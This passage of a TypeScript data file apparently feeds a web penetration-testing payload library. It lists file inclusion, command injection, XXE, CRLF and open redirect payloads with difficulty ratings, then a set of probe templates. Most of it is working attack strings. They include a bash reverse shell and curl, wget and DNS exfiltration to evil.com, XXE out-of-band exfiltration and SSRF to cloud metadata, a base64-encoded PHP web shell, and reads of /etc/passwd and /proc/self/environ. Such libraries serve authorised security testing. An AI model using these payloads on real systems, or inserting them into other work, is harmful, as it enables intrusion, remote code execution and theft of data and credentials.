          { id: "utf8-overlong", name: "UTF-8 Overlong", payload: "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd", description: "UTF-8 overlong encoding bypass", level: "Extreme", target: ["PHP", "Java", "Python"] },
          { id: "hash-fragment", name: "Hash Fragment", payload: "../../../etc/passwd%23", description: "Hash fragment truncation bypass", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "file-protocol", name: "File Protocol", payload: "file:///etc/passwd", description: "File protocol absolute path read", level: "Low", target: ["PHP", "Python", "Java", "Go"] },
          { id: "recursive-php", name: "Recursive PHP", payload: "php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=index.php", description: "Recursive PHP filter wrapper", level: "Hard", target: ["PHP"] },
          { id: "expect-wrapper", name: "Expect Wrapper", payload: "expect://id", description: "PHP expect wrapper RCE", level: "Extreme", target: ["PHP"] },
          { id: "data-wrapper", name: "Data Wrapper", payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==", description: "PHP data wrapper for code injection", level: "Extreme", target: ["PHP"] },
          { id: "input-wrapper", name: "Input Wrapper", payload: "php://input", description: "PHP input wrapper for POST data", level: "Extreme", target: ["PHP"] },
          { id: "self-ref", name: "Self Ref", payload: "/etc/passwd/../../etc/passwd", description: "Self-referential path traversal", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "triple-url", name: "Triple URL", payload: "%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd", description: "Triple URL encoding bypass", level: "Extreme", target: ["PHP", "Node.js", "Python"] },
          { id: "windows-alternate", name: "Windows Alternate", payload: "....//....//....//windows/win.ini", description: "Windows alternate directory traversal", level: "Low", target: ["PHP", "Python", "ASP.NET", "Java"] },
          { id: "proc-self-env", name: "Proc Self Env", payload: "/proc/self/environ", description: "Proc environ file read", level: "Medium", target: ["PHP", "Python"] },
          { id: "proc-self-cmd", name: "Proc Self Cmd", payload: "/proc/self/cmdline", description: "Proc cmdline file read", level: "Medium", target: ["PHP", "Python"] },
          { id: "php-filter-zlib", name: "PHP Filter Zlib", payload: "php://filter/zlib.deflate/convert.base64-encode/resource=index.php", description: "PHP zlib compressed filter read", level: "Hard", target: ["PHP"] },
          { id: "php-filter-waf", name: "PHP Filter WAF", payload: "php://filter/convert.iconv.utf-8.utf-7|convert.base64-encode/resource=index.php", description: "PHP iconv filter WAF evasion", level: "Hard", target: ["PHP"] },
          { id: "windows-unc", name: "Windows UNC", payload: "\\\\evil\\share\\file.txt", description: "Windows UNC path injection", level: "Extreme", target: ["PHP", "Python", "ASP.NET"] },
          { id: "cygwin-path", name: "Cygwin Path", payload: "c:/windows/win.ini", description: "Cygwin-style Windows path", level: "Low", target: ["PHP", "Python", "ASP.NET"] },
        ],
      },
    ],
  },
  {
    id: "cmdi",
    name: "CMDi",
    icon: "Terminal",
    subcategories: [
      {
        id: "cmdi-basic",
        name: "Basic CMDi",
        payloads: [
          { id: "semicolon-cmdi", name: "Semicolon", payload: "; id", description: "Semicolon command chaining", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "pipe", name: "Pipe", payload: "| id", description: "Pipe command injection", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "and-chain", name: "AND Chain", payload: "&& id", description: "AND logical operator chaining", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "or-chain", name: "OR Chain", payload: "|| id", description: "OR logical operator chaining", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "subshell", name: "Subshell", payload: "$(id)", description: "Bash subshell command execution", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "backtick", name: "Backtick", payload: "`id`", description: "Backtick command substitution", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "newline", name: "Newline", payload: "%0A id", description: "Newline encoded command injection", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "carriage", name: "Carriage", payload: "%0D%0A id", description: "CRLF encoded command injection", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "oob-curl", name: "OOB Curl", payload: "curl http://evil.com/$(hostname)", description: "Out-of-band data exfil via curl", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "windows-ping", name: "Windows Ping", payload: "ping -n 5 127.0.0.1", description: "Windows time-based ping injection", level: "Low", target: ["ASP.NET"] },
          { id: "sleep-blind", name: "Sleep Blind", payload: "sleep 5", description: "Blind time-based sleep command", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "dns-exfil", name: "DNS Exfil", payload: "nslookup $(whoami).evil.com", description: "DNS-based data exfiltration", level: "Extreme", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "brace-expand", name: "Brace Expand", payload: "{id,}", description: "Bash brace expansion injection", level: "Medium", target: ["PHP", "Node.js", "Python", "Go"] },
          { id: "process-sub", name: "Process Sub", payload: "$(<id)", description: "Bash process substitution", level: "Medium", target: ["PHP", "Node.js", "Python", "Go"] },
          { id: "null-byte-cmd", name: "Null Byte CMD", payload: "%00;id", description: "Null byte command separator", level: "Hard", target: ["PHP", "Java"] },
          { id: "quote-escape", name: "Quote Escape", payload: "\";id", description: "Double quote escape injection", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "hex-ip", name: "Hex IP", payload: "ping 0x7f000001", description: "Hex encoded IP address bypass", level: "Medium", target: ["PHP", "Node.js", "Python", "Go"] },
          { id: "ifs-bypass", name: "IFS Bypass", payload: "$IFS id", description: "IFS space bypass technique", level: "Medium", target: ["PHP", "Node.js", "Python", "Go"] },
          { id: "tab-space", name: "Tab Space", payload: "%09 id", description: "Tab character as space bypass", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "no-space-semi", name: "No Space Semi", payload: ";id", description: "No space after semicolon", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "no-space-pipe", name: "No Space Pipe", payload: "|id", description: "No space after pipe", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "newline-encode", name: "Newline Encode", payload: "%0Aid", description: "URL encoded newline without space", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "env-obfuscation", name: "Env Obfuscation", payload: "${PATH:0:1}id", description: "Environment variable obfuscation", level: "Hard", target: ["PHP", "Node.js", "Python", "Go"] },
          { id: "base64-cmd", name: "Base64 Cmd", payload: "echo $(echo 'aWQ=' | base64 -d)", description: "Base64 encoded command execution", level: "Medium", target: ["PHP", "Node.js", "Python", "Go"] },
          { id: "wildcard", name: "Wildcard", payload: "/???/passwd", description: "Wildcard path expansion", level: "Medium", target: ["PHP", "Node.js", "Python", "Go"] },
          { id: "octal-ip", name: "Octal IP", payload: "ping 0177.0.0.1", description: "Octal IP address format bypass", level: "Medium", target: ["PHP", "Node.js", "Python", "Go"] },
          { id: "temp-bypass", name: "Temp Bypass", payload: "%TEMP%", description: "Windows temp variable injection", level: "Medium", target: ["ASP.NET"] },
          { id: "ampersand-single", name: "Ampersand Single", payload: "& id &", description: "Single ampersand background injection", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "heredoc", name: "HereDoc", payload: "<<< id", description: "HereDoc command injection", level: "Medium", target: ["PHP", "Node.js", "Python"] },
          { id: "xterm-exfil", name: "XTerm Exfil", payload: "xterm -display evil.com:1", description: "XTerm display exfiltration", level: "Extreme", target: ["PHP", "Node.js", "Python", "Go"] },
          { id: "wget-exfil", name: "Wget Exfil", payload: "wget --post-file=/etc/passwd http://evil.com/", description: "Wget POST exfiltration", level: "Hard", target: ["PHP", "Python", "Go"] },
          { id: "bash-reverse", name: "Bash Reverse", payload: "bash -i >& /dev/tcp/evil.com/4444 0>&1", description: "Bash reverse shell", level: "Extreme", target: ["PHP", "Node.js", "Python", "Go"] },
          { id: "pwsh-powershell", name: "PWCS PowerShell", payload: "powershell -exec bypass -c \"whoami\"", description: "PowerShell command execution bypass", level: "Medium", target: ["ASP.NET"] },
          { id: "ampersand-space", name: "Ampersand Space", payload: "& id", description: "Ampersand with space injection", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
        ],
      },
    ],
  },
  {
    id: "xxe",
    name: "XXE",
    icon: "FileCode",
    subcategories: [
      {
        id: "xxe-basic",
        name: "Basic XXE",
        payloads: [
          { id: "basic-read", name: "Basic Read", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", description: "Basic XXE file read", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "oob-blind", name: "OOB Blind", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://evil.com/data\">%xxe;]>", description: "Out-of-band blind XXE", level: "Hard", target: ["PHP", "Java", "Python"] },
          { id: "php-wrapper-xxe", name: "PHP Wrapper", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><root>&xxe;</root>", description: "XXE with PHP filter wrapper", level: "Medium", target: ["PHP"] },
          { id: "ssrf", name: "SSRF", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>", description: "XXE SSRF to AWS metadata", level: "Hard", target: ["PHP", "Java", "Python"] },
          { id: "windows-read", name: "Windows Read", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>", description: "XXE Windows file read", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "xinclude", name: "XInclude", payload: "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></root>", description: "XInclude XXE attack", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "error-based", name: "Error Based", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]>", description: "Error-based XXE data exfiltration", level: "Hard", target: ["PHP", "Java", "Python"] },
          { id: "param-entity", name: "Param Entity", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;]><root>&send;</root>", description: "Parameter entity XXE attack", level: "Hard", target: ["PHP", "Java", "Python"] },
          { id: "svg-read", name: "SVG Read", payload: "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>", description: "XXE via SVG upload", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "utf7-bypass", name: "UTF-7 Bypass", payload: "<?xml version=\"1.0\" encoding=\"UTF-7\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", description: "UTF-7 encoded XXE bypass", level: "Hard", target: ["PHP", "Java", "Python"] },
          { id: "cdata-wrapper", name: "CDATA Wrapper", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;]><root>&content;</root>", description: "CDATA wrapped XXE exfiltration", level: "Hard", target: ["PHP", "Java", "Python"] },
          { id: "dtd-external", name: "DTD External", payload: "<?xml version=\"1.0\"?><!DOCTYPE root SYSTEM \"http://evil.com/evil.dtd\"><root>&xxe;</root>", description: "External DTD XXE attack", level: "Medium", target: ["PHP", "Java", "Python", "ASP.NET"] },
          { id: "xxe-xhtml", name: "XXE XHTML", payload: "<?xml version=\"1.0\"?><!DOCTYPE html [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><html xmlns=\"http://www.w3.org/1999/xhtml\">&xxe;</html>", description: "XXE via XHTML namespace", level: "Medium", target: ["PHP", "Java", "Python"] },
          { id: "xxe-port-scan", name: "XXE Port Scan", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/\">]><root>&xxe;</root>", description: "XXE internal port scanning", level: "Hard", target: ["PHP", "Java", "Python"] },
          { id: "xxe-expect-rce", name: "XXE Expect RCE", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"expect://id\">]><root>&xxe;</root>", description: "XXE expect wrapper RCE", level: "Extreme", target: ["PHP"] },
          { id: "xxe-ftp-oob", name: "XXE FTP OOB", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"ftp://evil.com:21/data\">%xxe;]>", description: "XXE FTP out-of-band exfiltration", level: "Hard", target: ["PHP", "Java", "Python"] },
          { id: "xxe-java-ssrf", name: "XXE Java SSRF", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/admin\">]><root>&xxe;</root>", description: "XXE Java SSRF internal access", level: "Hard", target: ["Java"] },
        ],
      },
    ],
  },
  {
    id: "crlf",
    name: "CRLF",
    icon: "ArrowLeftRight",
    subcategories: [
      {
        id: "crlf-basic",
        name: "Basic CRLF",
        payloads: [
          { id: "set-cookie", name: "Set-Cookie", payload: "%0d%0aSet-Cookie:%20malicious=1", description: "CRLF injection to set arbitrary cookie", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "response-split", name: "Response Split", payload: "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>xss</html>", description: "HTTP response splitting attack", level: "Hard", target: ["PHP", "Node.js", "Java", "ASP.NET"] },
          { id: "xss-via-crlf", name: "XSS via CRLF", payload: "%0d%0a<script>alert(1)</script>", description: "CRLF injection to inject XSS payload", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "location-redirect", name: "Location Redirect", payload: "%0d%0aLocation:%20http://evil.com", description: "CRLF injection to redirect response", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "cache-poison", name: "Cache Poison", payload: "%0d%0aX-Forwarded-Host:%20evil.com", description: "CRLF cache poisoning via Host header", level: "Hard", target: ["PHP", "Node.js", "Java", "ASP.NET"] },
          { id: "double-crlf", name: "Double CRLF", payload: "%0d%0a%0d%0a<script>alert(1)</script>", description: "Double CRLF to terminate headers", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "tab-bypass-crlf", name: "Tab Bypass", payload: "%09<script>alert(1)</script>", description: "Tab character injected via CRLF", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "space-bypass-crlf", name: "Space Bypass", payload: "%20<script>alert(1)</script>", description: "URL encoded space injection", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "cr-only", name: "CR Only", payload: "%0d<script>alert(1)</script>", description: "Carriage return only injection", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "lf-only", name: "LF Only", payload: "%0a<script>alert(1)</script>", description: "Line feed only injection", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "unicode-crlf", name: "Unicode CRLF", payload: "%E5%98%8D%E5%98%8A<script>alert(1)</script>", description: "Unicode overlong CRLF encoding bypass", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET"] },
          { id: "multiple-inj", name: "Multiple Inj", payload: "%0d%0aX-Custom:%20injected%0d%0aX-Another:%20header", description: "Multiple header injection via CRLF", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
        ],
      },
    ],
  },
  {
    id: "redirect",
    name: "Open Redirect",
    icon: "ExternalLink",
    subcategories: [
      {
        id: "redirect-basic",
        name: "Basic Redirect",
        payloads: [
          { id: "basic-http", name: "Basic HTTP", payload: "http://evil.com", description: "Basic HTTP redirect to external site", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "protocol-relative", name: "Protocol Relative", payload: "//evil.com", description: "Protocol-relative URL redirect bypass", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "at-sign", name: "At Sign", payload: "http://legit.com@evil.com", description: "URL with @ symbol authority confusion", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "double-slash", name: "Double Slash", payload: "//legit.com//evil.com", description: "Double slash authority confusion", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "backslash", name: "Backslash", payload: "\\@evil.com", description: "Backslash URL bypass technique", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET"] },
          { id: "fragment", name: "Fragment", payload: "http://evil.com#", description: "Hash fragment URL manipulation", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "port-confusion", name: "Port Confusion", payload: "http://legit.com:443@evil.com", description: "Port number authority confusion", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET"] },
          { id: "triple-slash", name: "Triple Slash", payload: "///evil.com", description: "Triple slash path traversal redirect", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "slash-backslash", name: "Slash Backslash", payload: "/\\/evil.com", description: "Slash backslash alternate redirect", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET"] },
          { id: "subdomain", name: "Subdomain", payload: "http://evil.com.legit.com", description: "Subdomain confusion redirect", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "double-dot-redirect", name: "Double Dot", payload: "/..;/..;/http://evil.com", description: "Double dot path traversal redirect", level: "Medium", target: ["PHP", "Java"] },
          { id: "newline-inj-redirect", name: "Newline Inj", payload: "http://evil.com%0aLocation:%20http://legit.com", description: "Newline injection in redirect URL", level: "Hard", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET"] },
          { id: "percent-bypass", name: "Percent Bypass", payload: "http://evil%2f@legit.com", description: "Percent encoded slash bypass", level: "Hard", target: ["PHP", "Node.js", "Java", "Python"] },
          { id: "proto-relative-enc", name: "Proto Relative Enc", payload: "//evil%2f@legit.com", description: "Protocol-relative with encoded bypass", level: "Hard", target: ["PHP", "Node.js", "Java", "Python"] },
          { id: "data-uri", name: "Data URI", payload: "data:text/html,<script>alert(1)</script>", description: "Data URI scheme redirect", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "blob-uri", name: "Blob URI", payload: "blob:http://evil.com", description: "Blob URI scheme redirect", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "Go"] },
          { id: "path-traverse", name: "Path Traverse", payload: "/..;/..;/..;/evil.com", description: "Path traversal redirect bypass", level: "Medium", target: ["PHP", "Java"] },
          { id: "unicode-url", name: "Unicode URL", payload: "http://evilã€‚com", description: "Unicode character substitution in URL", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "punycode", name: "Punycode", payload: "http://xn--e1v.com", description: "Punycode encoded domain redirect", level: "Low", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "js-uri-short", name: "JS URI Short", payload: "javascript:alert(1)//http://legit.com", description: "Javascript URI with short-circuit", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "param-pollution", name: "Param Pollution", payload: "?redirect=http://evil.com&url=http://legit.com", description: "Parameter pollution redirect bypass", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
          { id: "host-header", name: "Host Header", payload: "http://evil.com:80@legit.com", description: "Host header authority confusion", level: "Medium", target: ["PHP", "Node.js", "Java", "Python", "ASP.NET", "Go"] },
        ],
      },
    ],
  },
];

export const templates: Template[] = [
  { id: "basic-xss", name: "Basic XSS Probe", payload: "<script>alert(1)</script>", description: "Basic cross-site scripting test", category: "xss" },
  { id: "img-xss", name: "Image XSS", payload: "<img src=x onerror=alert(1)>", description: "Image tag with onerror XSS", category: "xss" },
  { id: "svg-xss", name: "SVG XSS", payload: "<svg onload=alert(1)>", description: "SVG onload XSS payload", category: "xss" },
  { id: "sqli-probe", name: "SQLi Probe", payload: "' OR 1=1--", description: "Basic SQL injection test", category: "sqli" },
  { id: "sqli-union-tpl", name: "SQLi UNION", payload: "' UNION SELECT 1,2,3,4,5--", description: "UNION-based SQL injection", category: "sqli" },
  { id: "ssti-probe", name: "SSTI Probe", payload: "{{7*7}}", description: "Server-side template injection test", category: "ssti" },
  { id: "lfi-probe", name: "LFI Probe", payload: "../../../etc/passwd", description: "Local file inclusion test", category: "lfi" },
  { id: "lfi-windows", name: "LFI Windows", payload: "..\\..\\..\\windows\\win.ini", description: "Local file inclusion for Windows", category: "lfi" },
  { id: "cmdi-probe", name: "CMDi Probe", payload: "; id", description: "Basic command injection test", category: "cmdi" },
  { id: "cmdi-blind", name: "CMDi Blind", payload: "sleep 5", description: "Blind time-based command injection", category: "cmdi" },
  { id: "xxe-probe", name: "XXE Probe", payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", description: "XML external entity injection test", category: "xxe" },
  { id: "crlf-probe", name: "CRLF Probe", payload: "%0d%0aSet-Cookie:%20test=1", description: "CRLF injection test", category: "crlf" },
  { id: "redirect-probe", name: "Redirect Probe", payload: "http://evil.com", description: "Open redirect test", category: "redirect" },
  { id: "redirect-relative", name: "Redirect Relative", payload: "//evil.com", description: "Protocol-relative redirect test", category: "redirect" },
];
